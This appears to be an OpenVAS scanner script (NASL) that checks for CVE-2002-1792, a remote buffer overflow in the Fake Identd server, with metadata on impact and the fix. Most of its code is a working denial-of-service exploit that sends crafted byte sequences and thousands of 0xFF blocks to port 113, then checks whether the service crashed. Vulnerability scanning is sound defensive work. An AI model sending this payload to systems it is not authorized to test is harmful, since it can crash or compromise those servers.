###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fake_identd_client_query_bof_vuln.nasl 4690 2016-12-06 14:44:58Z cfi $
#
# Fake Identd Client Query Remote Buffer Overflow Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803022");
  script_version("$Revision: 4690 $");
  script_cve_id("CVE-2002-1792");
  script_bugtraq_id(5351);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2016-12-06 15:44:58 +0100 (Tue, 06 Dec 2016) $");
  script_tag(name:"creation_date", value:"2012-09-05 11:02:48 +0530 (Wed, 05 Sep 2012)");
  script_name("Fake Identd Client Query Remote Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(113);

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/9731");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2002-07/0370.html");

  tag_impact = "Successful exploitation will allow attackers to cause buffer overflow
  condition or execute arbitrary code on the system with root privileges.

  Impact Level: System/Application";

  tag_affected = "Tomi Ollila Fake Identd version 0.9 through 1.4";

  tag_insight = "The identd server fails to handle a specially crafted long request that is
  split into multiple packets, which allows remote attackers to cause a
  buffer overflow.";

  tag_solution = "Upgrade to Fake Identd version 1.5 or later,
  For updates refer to http://freecode.com/projects/fakeidentd?topic_id=150";

  tag_summary = "This host is running Fake Identd server and is prone to buffer
  overflow vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


## Variable Initialization
res  = "";
exploit = "";
testmsg = "";
junkdata = "";
soc  = 0;
soc1 = 0;
soc2 = 0;
soc3 = 0;
soc4 = 0;
port = 0;

## Default Identd port
port = 113;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc){
   exit(0);
}

## Send some data to check if the Fake Identd server is running and responding
testmsg = string(crap(data:"A", length: 8), "\r\n");

send(socket:soc, data: testmsg);
res = recv(socket:soc, length:1024);
close(soc);

## Check the response for invalid request
if(!res || "INVALID-REQUEST" >!< res){
 exit(0);
}

## Open TCP Socket again
soc1 = open_sock_tcp(port);
if(!soc1){
  exit(0);
}

## Construct Crafted Long Exploit and Split it to 2
# Send first one
junkdata = '\x41\xEB\xEF\xFA\xB7';
send(socket:soc1, data: crap(data:"X", length: 19));
send(socket:soc1, data: junkdata);

exploit = crap(data:raw_string(0xFF), length:19);

## Send exploit multiple times
for(i=0 ;i< 6000; i++){
  send(socket:soc1, data: exploit);
}

close(soc1);

## Open TCP socket
soc2 = open_sock_tcp(port);
if(!soc2) exit(0);

## Second packet
junkdata = '\x41\x5B\xFF\xFF\xFF';
send(socket:soc2, data: crap(data:"X", length: 19));
send(socket:soc2, data: junkdata);

exploit = crap(data:raw_string(0xFF), length:19);

## Send exploit multiple times
for(i=0 ;i < 6000; i++){
  send(socket:soc2, data: exploit);
}

close(soc2);

## Try to open TCP socket
soc3 =  open_sock_tcp(port);
if(!soc3)
{
  security_message(port);
  exit(0);
}

send(socket:soc3, data:string("1234, 1234\n"));
res = recv(socket:soc3, length:4096);
close(soc3);

soc4 =  open_sock_tcp(port);
if(!soc4)
{
  security_message(port);
  exit(0);
}

close(soc4);
